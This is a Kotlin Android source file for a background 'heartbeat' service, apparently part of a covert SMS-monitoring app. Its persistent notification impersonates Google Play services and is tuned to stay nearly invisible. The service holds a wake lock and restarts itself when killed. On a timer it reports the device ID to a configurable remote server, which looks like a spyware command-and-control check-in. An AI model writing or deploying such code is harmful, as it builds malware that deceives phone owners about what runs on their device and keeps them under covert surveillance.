package com.example.test

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class HeartbeatService : Service() {

    private lateinit var deviceId: String
    private val handler = Handler(Looper.getMainLooper())
    private var wakeLock: PowerManager.WakeLock? = null
    
    companion object {
        private const val TAG = "HeartbeatService"
        // ⭐ استفاده از همون notification SmsService - فقط update می‌کنیم نه create جدید
        private const val NOTIFICATION_ID = 1  // ⭐ یکسان با SmsService
        private const val CHANNEL_ID = "sms_service_channel"  // ⭐ یکسان با SmsService
    }
    
    // ⭐ خواندن interval از ServerConfig
    private val heartbeatInterval: Long
        get() = ServerConfig.getHeartbeatInterval()

    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            try {
                Log.d(TAG, "⏰ Heartbeat timer triggered")
                sendHeartbeat()
                // ⭐ استفاده از interval دینامیک
                handler.postDelayed(this, heartbeatInterval)
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error in heartbeat runnable: ${e.message}", e)
                // Retry بعد از 30 ثانیه در صورت خطا
                handler.postDelayed(this, 30000)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🚀 HEARTBEAT SERVICE CREATED")
        Log.d(TAG, "════════════════════════════════════════")
        
        // ⭐ Log Direct Boot status
        com.example.test.utils.DirectBootHelper.logStatus(this)
        
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        
        // ⭐ Initialize ServerConfig اگر initialize نشده
        try {
            ServerConfig.initialize(this)
            Log.d(TAG, "✅ ServerConfig initialized in HeartbeatService")
        } catch (e: Exception) {
            Log.e(TAG, "⚠️ Failed to initialize ServerConfig: ${e.message}")
            // ادامه می‌دیم چون getBaseUrl() می‌تونه از default استفاده کنه
        }
        
        // ⭐ WakeLock
        acquireWakeLock()
        
        startForegroundNotification()
        
        // ⭐ ارسال فوری اولین Heartbeat (بدون تاخیر)
        Log.d(TAG, "📤 Sending immediate heartbeat...")
        sendHeartbeat()
        
        // ⭐ شروع periodic heartbeat با interval
        handler.postDelayed(heartbeatRunnable, heartbeatInterval)
        
        Log.d(TAG, "💓 Heartbeat started with interval: ${heartbeatInterval}ms (${heartbeatInterval / 1000 / 60} minutes)")
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "$TAG::WakeLock"
            )
            wakeLock?.acquire(10 * 60 * 1000L)
            Log.d(TAG, "✅ WakeLock acquired")
        } catch (e: Exception) {
            Log.e(TAG, "❌ WakeLock failed: ${e.message}")
        }
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play services",  // ⭐ یکسان با SmsService
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Google Play services keeps your apps up to date"  // ⭐ یکسان
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play services")  // ⭐ یکسان با SmsService
            .setContentText("Updating apps...")  // ⭐ یکسان با SmsService
            .setSmallIcon(android.R.drawable.stat_notify_sync)  // ⭐ آیکون sync کم‌رنگ
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true)
            .build()

        // ⭐ startForeground با سازگاری با همه نسخه‌های اندروید
        // ⭐ استفاده از همون NOTIFICATION_ID و CHANNEL_ID که SmsService استفاده می‌کنه
        // این باعث میشه که فقط یک notification نمایش داده بشه
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+ (API 34+) - با foregroundServiceType
            startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            // Android 7-13 - بدون type
            startForeground(NOTIFICATION_ID, notification)
        }
        Log.d(TAG, "✅ Foreground service started (using shared notification)")
    }

    private fun sendHeartbeat() {
        Thread {
            try {
                Log.d(TAG, "════════════════════════════════════════")
                Log.d(TAG, "📤 SENDING HEARTBEAT")
                Log.d(TAG, "════════════════════════════════════════")
                
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("isOnline", true)
                    put("timestamp", System.currentTimeMillis())
                    put("source", "HeartbeatService")
                }

                val baseUrl = ServerConfig.getBaseUrl()
                val urlString = "$baseUrl/devices/heartbeat"
                
                Log.d(TAG, "📱 Device ID: $deviceId")
                Log.d(TAG, "🌐 URL: $urlString")
                Log.d(TAG, "📤 Body: ${body.toString()}")
                
                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                conn.doOutput = true

                Log.d(TAG, "🔗 Opening connection...")
                conn.outputStream.use { os ->
                    val bytes = body.toString().toByteArray()
                    Log.d(TAG, "📊 Body size: ${bytes.size} bytes")
                    os.write(bytes)
                    os.flush()
                }

                val responseCode = conn.responseCode
                Log.d(TAG, "📥 Response Code: $responseCode")
                
                if (responseCode in 200..299) {
                    val response = conn.inputStream.bufferedReader().use { it.readText() }
                    Log.d(TAG, "✅ Heartbeat sent successfully: $responseCode")
                    Log.d(TAG, "📥 Response: $response")
                } else {
                    val errorResponse = conn.errorStream?.bufferedReader()?.use { it.readText() }
                    Log.w(TAG, "⚠️ Heartbeat response: $responseCode")
                    Log.w(TAG, "📥 Error Response: $errorResponse")
                }
                
                conn.disconnect()
                Log.d(TAG, "════════════════════════════════════════")
            } catch (e: java.net.ConnectException) {
                Log.e(TAG, "❌ Connection failed: Cannot reach server", e)
            } catch (e: java.net.SocketTimeoutException) {
                Log.e(TAG, "❌ Connection timeout", e)
            } catch (e: Exception) {
                Log.e(TAG, "❌ Heartbeat error: ${e.message}", e)
                e.printStackTrace()
            }
        }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "📞 onStartCommand called")
        // ⭐ START_STICKY برای بازگشت خودکار
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        
        Log.w(TAG, "⚠️ HeartbeatService destroyed - Attempting restart...")
        
        handler.removeCallbacks(heartbeatRunnable)
        
        // ⭐ آزاد کردن WakeLock
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                    Log.d(TAG, "✅ WakeLock released")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ WakeLock release failed: ${e.message}")
        }
        
        // ⭐ تلاش برای Restart خودکار
        try {
            val restartIntent = Intent(applicationContext, HeartbeatService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restartIntent)
            } else {
                applicationContext.startService(restartIntent)
            }
            Log.d(TAG, "🔄 Restart scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Restart failed: ${e.message}")
        }
    }
}